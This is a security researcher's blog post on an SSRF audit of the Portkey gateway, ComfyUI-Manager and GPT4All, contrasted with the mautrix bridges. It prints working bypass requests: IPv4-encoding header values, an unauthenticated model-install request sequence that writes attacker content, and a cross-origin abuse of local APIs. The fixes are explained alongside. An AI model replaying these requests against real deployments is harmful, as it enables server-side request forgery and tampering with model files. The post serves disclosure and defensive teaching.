---
title: "The validator wars: three SSRF/input validators, three bypasses"
description: "A best-in-class URL validator beaten by its own parser, a whitelist that never checks the URL, and a server with no validator at all. Plus the bridge that closed the same seam properly."
pubDate: 24 Sep 2026
---

Every SSRF needs the same seam: code that fetches a URL an attacker
influences. The defense everyone reaches for is a validator in front of the
fetch. This post is three of them, taken apart in the same audit round.

The first is a genuinely good validator, beaten by its own parser. The
second is a whitelist that never looks at the URL. The third ships no
validator at all, which is also a decision, just not a written-down one.
At the end, a project that closed the same seam without any of this
drama, because the contrast is the useful part.

## Portkey: the validator loses to its own parser

Portkey's gateway (v1.15.2) proxies LLM traffic, and an attacker-supplied
`x-portkey-custom-host` header controls the upstream base URL. The
validator in front of that header is the best one I have audited: scheme
allowlist, no credentials, no encoded characters, a homograph regex,
trailing-dot and subdomain-depth checks, blocklists for internal hosts and
cloud metadata, then decimal/hex/octal/shortened-IPv4 detection. Someone
read up on SSRF before writing this.

Then the order of operations happens. `new URL()` runs before the
alternative-IP checks, and WHATWG canonicalization folds every one of
those encodings into dotted decimal. Worse, `localhost` and `127.0.0.1`
sit in a trusted-host set with an early return, so the canonical form
`127.0.0.1` skips every blocklist that follows it:

```
GET /v1/probe
x-portkey-custom-host: http://2130706433:9911
→ 200, gateway POSTs to http://127.0.0.1:9911/probe

x-portkey-custom-host: http://0x7f000001:9911
→ 200, same callback hit

x-portkey-custom-host: http://0177.0.0.1:9911
→ 200, same

x-portkey-custom-host: http://127.1:9911
→ 200, same
```

Eight encodings were tested, eight produced a 200 and a server-side
callback: decimal, hex, mixed hex, hex-short, octal, octal-short,
shortened, trailing dot. The anti-obfuscation checks are not weak, they
are unreachable. For any http(s) URL the parser canonicalizes first, so
the alternative-IP detector only ever sees strings the parser already
normalized. The same shape repeats one layer down: the homograph regex
rejects any hostname containing `:`, so the entire IPv6 private-range
defense is dead code.

Two more bypasses fell out of the same audit. The validator never
resolves DNS, so `127.0.0.1.nip.io` passes every string check and
resolves to loopback at fetch time. And redirects are never re-validated:
a fetch to an attacker-controlled host that answers 302 lands wherever
the redirect points, unchecked.

The fix is boring and real. Validate the pre-parsed string AND
re-inspect `url.hostname` after canonicalization, drop loopback from the
default trusted set in production, resolve DNS and re-check the returned
records, pass `redirect: 'manual'` and re-validate every hop. Defensive
code that runs before the parser is decorating the input, not validating
it.

## ComfyUI-Manager: the whitelist that never checks the URL

ComfyUI-Manager installs models from user-supplied URLs, so it checks
install requests against a whitelist. Here is the whole check:

```python
async def check_whitelist_for_model(item):
    json_obj = await core.get_data_by_mode('cache', 'model-list.json')
    for x in json_obj.get('models', []):
        if x['save_path'] == item['save_path'] and x['base'] == item['base'] and x['filename'] == item['filename']:
            return True
    json_obj = await core.get_data_by_mode('local', 'model-list.json')
    for x in json_obj.get('models', []):
        if x['save_path'] == item['save_path'] and x['base'] == item['base'] and x['filename'] == item['filename']:
            return True
    return False
```

save_path, base, filename. The `url` field, the one that decides where
the server fetches from, is never compared. Verified live against a
local instance, unauthenticated, default security level:

```
POST /manager/db_mode
{"value": "local"}
→ 200

POST /manager/queue/install_model
{"type": "checkpoint", "base": "upscale",
 "save_path": "checkpoints/upscale",
 "filename": "x4-upscaler-ema.safetensors",
 "url": "http://127.0.0.1:8899/x4-upscaler-ema.safetensors"}
→ 200, whitelist passes (save_path/base/filename all match)

POST /manager/queue/start
→ 200, worker downloads from the attacker-chosen URL
→ models/checkpoints/upscale/x4-upscaler-ema.safetensors now contains
  the attacker body, byte for byte
```

That is unauthenticated SSRF with an attacker-controlled write into the
models tree, which is exactly where ComfyUI loads model artifacts from
on later runs. One honest caveat: the read-back hop I wanted does not
close. ComfyUI's `/view` endpoint serves only the input/temp/output
trees, and no whitelisted save_path lands in those, so the fetched body
cannot be read back out through the API that way. The write stands; the
exfil loop does not.

The whitelist itself is fine. Checking the wrong fields is the bug.

## GPT4All: no validator at all

GPT4All's local API server (QHttpServer, Qt, in
`gpt4all-chat/src/server.cpp`) has no URL validation because it barely
has an HTTP surface: three completion routes, an auth gate that is one
settings toggle, and this appended to every response unconditionally:

```cpp
m_server->addAfterRequestHandler(this,
    [](const QHttpServerRequest &req, QHttpServerResponse &resp) {
    Q_UNUSED(req);
    auto headers = resp.headers();
    headers.append("Access-Control-Allow-Origin"_L1, "*"_L1);
    resp.setHeaders(std::move(headers));
});
```

`Access-Control-Allow-Origin: *` on every response, no Origin parsing,
no Host validation anywhere in the server. When the user enables the
API server, any web page can POST completions to the local instance and
read the responses back: conversation content disclosure, forced model
loads, and a quieter one, completion requests mutate the shared GUI chat
state, so a page can inject prompts into a chat session the user is
watching.

The project is discontinued (no commits since May 2025), so there is no
patch lane and this is documented as evidence rather than filed. It
completes a family: llama.cpp, llamafile, GPT4All, all local servers
that answer cross-origin by default when their API is switched on.

## The contrast: mautrix closed this seam

The same audit round included the mautrix bridges, where the headline
chain was that any WhatsApp user could trigger privileged bridge actions
by sending a message. It does not work. The reasons are worth seeing,
because mautrix faced the same design problem as the three above and
shipped the boring answers.

Commands are Matrix-origin only: remote messages are relayed into
Matrix by ghost intents and the command processor is never fed remote
events. Permissions are a config allowlist keyed by exact user, then
homeserver domain, then `*`, and an unconfigured user defaults to
blocked. Provisioning endpoints are disabled unless a 16-character
secret is configured. Nothing there is clever. It is deny-by-default
plus origin checking, applied on every path, which is what each loser
above had exactly one of.

## What generalizes

- Validator position beats validator quality. Portkey's checks were
  excellent and all unreachable because `new URL()` ran first. Validate
  the canonical form, not the string.
- Whitelists fail on the fields they do not contain. ComfyUI-Manager's
  list is a real control; the URL just is not in it.
- The absence of a validator is also a decision. GPT4All made it by
  accident, every default-on local API makes it.
- Deny-by-default with origin checks is the whole game. mautrix shows
  the ceiling is reachable without heroics.

PoC scripts and the full findings for this round are collected at
[github.com/terrafying/pocolate](https://github.com/terrafying/pocolate).
Related: [three live proofs](/blog/three-live-proofs/) from the same
round, and the method behind both posts, [tireless search beats
cleverness](/blog/tireless-search/).
